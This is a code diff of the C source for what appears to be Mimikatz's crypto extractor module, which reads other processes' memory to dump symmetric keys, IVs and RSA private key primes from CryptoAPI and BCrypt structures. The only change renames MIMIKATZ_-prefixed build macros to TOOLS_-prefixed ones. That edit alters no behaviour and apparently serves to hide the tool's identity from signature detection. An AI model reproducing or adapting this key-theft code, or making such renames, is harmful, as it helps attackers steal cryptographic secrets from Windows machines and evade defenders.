@@ -47,7 +47,7 @@ void kuhl_m_crypto_extractor_capi32(PKULL_M_MEMORY_ADDRESS address)
 								}
 								kprintf(L"\n");
 
-								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) // damn XP...
+								if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) // damn XP...
 								{
 									if(GET_ALG_TYPE(pXp->Algid) == ALG_TYPE_BLOCK)
 									{
@@ -91,9 +91,9 @@ void kuhl_m_crypto_extractor_capi32(PKULL_M_MEMORY_ADDRESS address)
 
 							if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_RSA)
 							{
-								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
+								if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
 									i = 308;
-								else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
+								else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
 									i = 300;
 								else 
 									i = 356;
@@ -201,9 +201,9 @@ void kuhl_m_crypto_extractor_capi64(PKULL_M_MEMORY_ADDRESS address)
 
 								if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_RSA)
 								{
-									if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
+									if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
 										i = 384;
-									else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
+									else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
 										i = 368;
 									else 
 										i = 432;
@@ -333,7 +333,7 @@ void kuhl_m_crypto_extractor_bcrypt32(PKULL_M_MEMORY_ADDRESS address)
 						{
 						case BCRYPT_CIPHER_INTERFACE:
 							kprintf(L"%s (0x%x)\n", kull_m_crypto_bcrypt_cipher_alg_to_str(alg), Header.type);
-							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
+							if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
 							{
 								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwMode);
 								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwBlockLen); k |= *((PBYTE) p + Header.size + i++ - ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwBlockLen));
@@ -346,7 +346,7 @@ void kuhl_m_crypto_extractor_bcrypt32(PKULL_M_MEMORY_ADDRESS address)
 								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwData);
 								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_6_32) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwData, 0);
 							}
-							else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
+							else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
 							{
 								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwMode);
 								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwBlockLen); k |= ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->IV[i++]);
@@ -379,14 +379,14 @@ void kuhl_m_crypto_extractor_bcrypt32(PKULL_M_MEMORY_ADDRESS address)
 							switch(Header.tag)
 							{
 							case 'MSRK':
-								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
+								if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
 								{
 									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->PublicExponent, 1 * 4, L"PubExp    ");
 									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->nbModulus * 4, L"Modulus   ");
 									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime1.Prime, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime1.nbBlock * 4, L"Prime1    ");
 									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime2.Prime, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime2.nbBlock * 4, L"Prime2    ");
 								}
-								else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
+								else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
 								{
 									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->PublicExponent, 1 * 4, L"PubExp    ");
 									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->nbModulus * 4, L"Modulus   ");
@@ -516,7 +516,7 @@ void kuhl_m_crypto_extractor_bcrypt64(PKULL_M_MEMORY_ADDRESS address)
 						{
 						case BCRYPT_CIPHER_INTERFACE:
 							kprintf(L"%s (0x%x)\n", kull_m_crypto_bcrypt_cipher_alg_to_str(alg), Header.type);
-							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
+							if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
 							{
 								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwMode);
 								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwBlockLen); k |= *((PBYTE) p + Header.size + i++ - ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwBlockLen));
@@ -529,7 +529,7 @@ void kuhl_m_crypto_extractor_bcrypt64(PKULL_M_MEMORY_ADDRESS address)
 								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwData);
 								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_6_64) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwData, 0);
 							}
-							else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
+							else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
 							{
 								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwMode);
 								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwBlockLen); k |= ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->IV[i++]);
@@ -562,14 +562,14 @@ void kuhl_m_crypto_extractor_bcrypt64(PKULL_M_MEMORY_ADDRESS address)
 							switch(Header.tag)
 							{
 							case 'MSRK':
-								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
+								if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
 								{
 									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->PublicExponent, 1 * 8, L"PubExp    ");
 									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->nbModulus * 8, L"Modulus   ");
 									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime1.Prime, (DWORD) ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime1.nbBlock * 8, L"Prime1    ");
 									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime2.Prime, (DWORD) ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime2.nbBlock * 8, L"Prime2    ");
 								}
-								else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
+								else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
 								{
 									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->PublicExponent, 1 * 8, L"PubExp    ");
 									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->nbModulus * 8, L"Modulus   ");
@@ -783,12 +783,12 @@ BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysisBCrypt(PMEMORY_BASIC_INFORMATI
 					if(
 						#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 						RtlEqualMemory(cur, (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ?
-						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt64_old : Bcrypt64)
+						((TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt64_old : Bcrypt64)
 						:
-						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32)
+						((TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32)
 						, size)
 						#elif defined(_M_IX86)
-						RtlEqualMemory(cur, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32, size) 
+						RtlEqualMemory(cur, (TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32, size) 
 						#endif
 					)
 					{
@@ -856,9 +856,9 @@ BOOL CALLBACK kuhl_m_crypto_extract_ProcessAnalysis(PSYSTEM_PROCESS_INFORMATION 
 							}
 						}
 
-						if(MIMIKATZ_NT_MAJOR_VERSION > 5)
+						if(TOOLS_NT_MAJOR_VERSION > 5)
 						{
-							if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"bcrypt.dll" : L"bcryptprimitives.dll", &cryptInfos))
+							if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, (TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"bcrypt.dll" : L"bcryptprimitives.dll", &cryptInfos))
 							{
 								ps->Machine = pNtHeaders->FileHeader.Machine;
 								ps->bAllProcessKiwiCryptKey = FALSE;
